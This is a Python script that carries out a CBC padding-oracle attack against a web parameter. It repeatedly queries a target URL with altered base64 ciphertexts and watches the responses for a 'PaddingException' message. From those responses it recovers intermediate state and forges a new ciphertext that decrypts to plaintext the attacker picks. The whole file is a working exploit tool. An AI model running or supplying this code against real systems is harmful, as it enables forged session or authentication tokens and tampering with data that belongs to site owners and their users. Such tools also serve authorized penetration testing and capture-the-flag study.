# Uses a padding oracle to build a new ciphertext, based on a provided ciphertext, which will return a desired plaintext when decrypted.
# Parameters:
#  url: The base target URL
#  param: The HTTP GET parameter
#  original_cipher: The original ciphertext
#  original_plain: The original plaintext
#  new_plain: The new plaintext used to build the new ciphertext
#  substitutions: A string containing characters to substitute for URL encoded base64 ciphertext, ex:
#      '-+_/.=' In the original cipher, substitute '-' for '+', '_' for '/', and '.' for '='

import base64
import urllib.request
import math
import sys
from urllib.error import URLError, HTTPError

block_size = 16

def clean(s):
   out = s
   for i in range(0, len(substitutions), 2):
      out = out.replace(substitutions[i], substitutions[i+1]);
   return out

def dirty(s):
   out = s
   for i in range(0, len(substitutions), 2):
      out = out.replace(substitutions[i+1], substitutions[i]);
   return out

def get_blocks(s):
   index = 0
   blocks = []
   while index < len(s):
      blocks.append(s[index:index+block_size])
      index += block_size
   return blocks

def get_short_url(u, enc, size):
   decoded = bytearray(base64.b64decode(clean(enc)))
   blocks = get_blocks(decoded)
   b2 = []
   for i in range(size):
      b2.extend(blocks[i])
   n = dirty(base64.b64encode(bytearray(b2)).decode('utf8'))
   return u + n

def pad(s):
   length = len(s)
   p = (math.ceil(length/block_size) * block_size) - length
   if p == 0:
       p = block_size
   padding = ''
   for i in range(p):
      padding = padding + chr(p)
   return s + padding

def update_url(req, block, new_bytes):
   parts = req.split(param)
   url = parts[0] + param
   n = bytearray(base64.b64decode(clean(parts[1])))
   for i in range(block_size):
      j = i + (block * block_size)
      a = n[j] ^ new_bytes[i] ^ last_plain[j]
      n[j] = a
   req = url + dirty(base64.b64encode(n).decode())
   return req

def solver(req, plain_bytes, target):
   raw = []
   pIndex = (need_blocks * block_size - 1) - block_size
   parts = req.split(param)
   url = parts[0] + param
   decoded = bytearray(base64.b64decode(clean(parts[1])))
   while pIndex >= 0:
      cIndex = pIndex + block_size
      i = pIndex % block_size
      pad = block_size - i
      pBlock = math.floor(pIndex / block_size)
      cBlock = pBlock + 1
      pStart = pBlock * block_size
      if i == 15:
         intermediate = [0] * block_size
         last = len(decoded) - (block_size * (need_blocks - cBlock - 1))
         modified = decoded.copy()[0 : last]
         for k in range(pStart, pStart+block_size):
            modified[k] = 0
      else:
         for k in range(0, pad):
            b = block_size - k - 1
            p = pStart + b
            modified[p] = intermediate[b] ^ pad
      j = 0
      found = False
      errors = 0
      if cBlock > target:
         found = True
         raw.insert(0, plain_bytes[pIndex])
      elif cBlock == target:
         print('Block: ' + str(cBlock) + ', Current index: ' + str(cIndex) + ', Previous index: ' + str(pIndex))
      else:
         found = True
         raw.insert(0, last_plain[pIndex])
      while j < 256 and not found and errors < 10:
         try:
            modified[pIndex] = j
            a = base64.b64encode(bytearray(modified[(pBlock * block_size):(cBlock * block_size)])).decode()
            print('Trying: ' + a)
            response = urllib.request.urlopen(url + dirty(base64.b64encode(modified).decode()))
            out = str(response.read())
            if 'PaddingException' not in out:
               intermediate[i] = j ^ pad
               p = intermediate[i] ^ decoded[pIndex]
               raw.insert(0, p)
               print('Found character ' + str(p) + ' at index ' + str(pIndex))
               found = True
            errors = 0
            j += 1
         except (HTTPError, URLError) as e:
            errors += 1
      if not found or errors == 10:
         print('Not found, request error count ' + str(errors))
         return []
      pIndex -= 1
   return raw

# Parse the URL
url = sys.argv[1]
param = '?' + sys.argv[2] + '='
if (url[len(url)-1]) != '/':
   url = url + '/'
url = url + param

# Get the original cipher text
original_cipher = sys.argv[3]
max_blocks = int(len(original_cipher) / 24)

# Get the original plaintext string, add padding, and convert to an array
original_plain = bytearray(pad(sys.argv[4]), 'utf8')

# Build new padded string and split into blocks
new_plain = pad(sys.argv[5])
new_plain_bytes = bytearray(new_plain, 'utf8')
new_plain_blocks = get_blocks(new_plain)
new_plain_blocks_len = len(new_plain_blocks)
need_blocks = new_plain_blocks_len + 1

# Get the base64 URL encoding substitution characters if provided
substitutions = ''
try:
   substitutions = sys.argv[6]
except:
   pass

# Build the first short URL
short_url = get_short_url(url, original_cipher, need_blocks)
print('S: ' + short_url)

# Build a new ciphertext based on the desired plaintext
updated_url = short_url
last_plain = original_plain.copy()
for i in range(new_plain_blocks_len - 1, -1, -1):
   updated_url = update_url(updated_url, i, bytearray(new_plain_blocks[i], 'utf8'))
   print(str(i) + ': ' + updated_url)
   last_plain = solver(updated_url, new_plain_bytes, i)
   print(str(last_plain))

# Attempt to see what is returned by the final URL
try:
   response = urllib.request.urlopen(updated_url)
   out = str(response.read())
   print(out)
except (HTTPError, URLError) as e:
   print('Error making request to updated URL')
